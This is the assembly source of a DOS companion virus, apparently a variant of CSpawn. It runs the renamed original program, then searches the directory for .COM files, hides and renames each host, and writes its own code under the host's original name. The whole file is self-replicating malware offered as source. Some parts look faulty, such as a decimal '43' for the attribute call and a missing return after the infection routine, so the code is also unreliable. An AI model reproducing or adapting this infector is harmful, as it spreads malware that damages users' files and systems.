.model tiny
.code
        org 100h
CSpawn:

		;;; Reduce the memory the virus takes for itself
		;;;...by moving the stack
        MOV SP, offset FINISH + 100h
        MOV AH, 4AH 					;int21h resize function
        MOV BX,SP
        MOV CL,4
        SHR BX,CL						;we need BX in paragraphs (divide by 16 by shifting)
        INC BX
        INT 21H


		;;; Parameters block set-up
        MOV BX,2Ch
        MOV AX,[BX]
        MOV WORD PTR [PARAM_BLK],AX
        MOV AX,CS
        MOV WORD PTR [PARAM_BLK+4],AX
        MOV WORD PTR [PARAM_BLK+8],AX
        MOV WORD PTR [PARAM_BLK+12],AX


		;;; Host execution
        MOV DX,offset NEW_NAME
        MOV BX,offset PARAM_BLK
        MOV AX,4B00h
        INT 21h

        CLI
		mov     bx,ax                   ;save return code here
        mov     ax,cs                   ;AX holds code segment
        mov     ss,ax                   ;restore stack first 
        mov     sp,(FINISH - CSpawn) + 200H
        sti                
		push    bx                
		mov     ds,ax                   ;Restore data segment
        mov     es,ax                   ;Restore extra segment
        mov     ah,1AH                  ;DOS set DTA function    
        mov     dx,80H                  ;put DTA at offset 80H      
        int     21H                
		call    FIND_FILES              ;Find and infect files
        pop     ax                      ;AL holds return value 
        mov     ah,4CH                  ;DOS terminate function     
		int     21H                     ;bye-bye

;The following routine searches for COM files and infects them
FIND_FILES:                
		mov     dx,OFFSET COM_MASK      ;search for COM files
        mov     ah,4EH                  ;DOS find first file function 
        xor     cx,cx                   ;CX holds all file attributes
FIND_LOOP:      
		int     21H    
		jc      FIND_DONE               ;Exit if no files found
		call TELL_SIZE					;NEAR procedure which puts into BX the size of the .com file found 
		CMP BX, (FINISH - CSpawn)		;BX stores the size of the program to be infected and compares it with size of virus
		JE SEARCH_NEXT
		call    INFECT_FILE             ;Infect the file!	
SEARCH_NEXT:		
        mov     ah,4FH                  ;DOS find next file function 
        jmp     FIND_LOOP               ;Try finding another file
FIND_DONE:      ret                     ;Return to caller
        COM_MASK        db      '*.COM',0               ;COM file search mask

;This routine infects the file specified in the DTA.

INFECT_FILE:   
	;;; First of all, we create a randomly called, empty file
		MOV AH, 5AH 					;function for creating randomly named file
		MOV DX, OFFSET NEW_FILE_PATH
		XOR CX, CX 						;set the file as visible because in this file we will write the virus
		INT 21H;
		
		MOV BX, AX 						;file handler is returned in AX and moved in BX so we can write into this file
		
		ADD DX, 2 						;In DX se va intoarce numele fisierului la modul ./RKJRTS, vrem sa sarim peste ./
		MOV SI, DX
		MOv DI, OFFSET NEW_NAME

INF_LOOP:  

		;We copy the new file name in a buffer
		
		lodsb                           ;Load a character
		stosb                           ;and save it in buffer
		or      al,al                   ;Is it a NULL?
		jnz     INF_LOOP                ;If so then leave the loop
	   
		MOV SI, offset NEW_NAME
		MOV DI, offset NEW_NAME_COPY
		CALL BUFFER_STRING_COPY
		;We add .con extension to the new name
		MOV WORD PTR [NEW_NAME+8], '.'
		MOV BYTE PTR [NEW_NAME+9], 'C'
		MOV BYTE PTR [NEW_NAME+10], 'O'
		MOV BYTE PTR [NEW_NAME+11], 'N' 
		
		;Function AH=43 - "CHMOD" - SET FILE ATTRIBUTES
		;Set the old host as hidden
		MOV AH, 43
		MOV AL, 01h
		MOV CX, 1
		MOV DX, 9EH
		INT 21H
	
		;Rename original host
		mov     dx,9EH                  ;DTA + 1EH
		mov     di,OFFSET NEW_NAME                
		mov     ah,56H                  ;rename original file
		int     21H
		
		
		
		;We clear the buffer in which the file path + name was written by INT21h
		MOV WORD PTR[NEW_FILE_PATH], '\.' 
		MOV WORD PTR[NEW_FILE_PATH+2], 0
		MOV WORD PTR[NEW_FILE_PATH+4], 0
		MOV WORD PTR[NEW_FILE_PATH+6], 0
		MOV WORD PTR[NEW_FILE_PATH+8], 0
		MOV WORD PTR[NEW_FILE_PATH+10], 0
		MOV WORD PTR[NEW_FILE_PATH+12], 0
	
		jc      INF_EXIT                ;if can’t rename, already done

	
        mov     ah,40H                  ;DOS write to file function
        mov     cx,FINISH - CSpawn      ;CX holds virus length
        mov     dx,OFFSET CSpawn        ;DX points to CSpawn of virus
        int     21H                
		mov     ah,3EH                  ;DOS close file function
        int     21H
		
		
		;Rename the file containing the virus to how the host was called
		mov     dx, OFFSET NEW_NAME_COPY     ;DTA + 1EH
		mov     di, 9EH         
		mov     ah,56H                  ;rename original file
		int     21H	
	
	
TELL_SIZE PROC
		MOV BX, 9AH
		MOV CX, [BX]
		MOV WORD PTR[FILE_SIZE_LW], CX

		MOV BX, 9CH
		MOV CX, [BX]
		MOV WORD PTR[FILE_SIZE_MW], CX

		MOV BX, WORD PTR[FILE_SIZE_LW]
		RET
TELL_SIZE ENDP	
	
		
BUFFER_STRING_COPY:
THE_LOOP:  
		; Copy name in a buffer
		lodsb                           ;Load a character
		stosb                           ;and save it in buffer
		or      al,al                   ;Is it a NULL?
		jnz     THE_LOOP                ;If so then leave the loop		
		
INF_EXIT:       ret
		NEW_NAME       db      13 dup (?)              ;Name of host to execute
		NEW_FILE_PATH DB '.\', 13 dup(0) 				
		NEW_NAME_COPY      db      13 dup (?) 
		FILE_SIZE_MW DW ?  
		FILE_SIZE_LW DW ?  
		;DOS EXEC function parameter block
			PARAM_BLK       DW      ?                       ;environment segment
						DD      80H                     ;@ of command line
						DD      5CH                     ;@ of first FCB
						DD      6CH                     ;@ of second FCB
FINISH:
	END     CSpawn
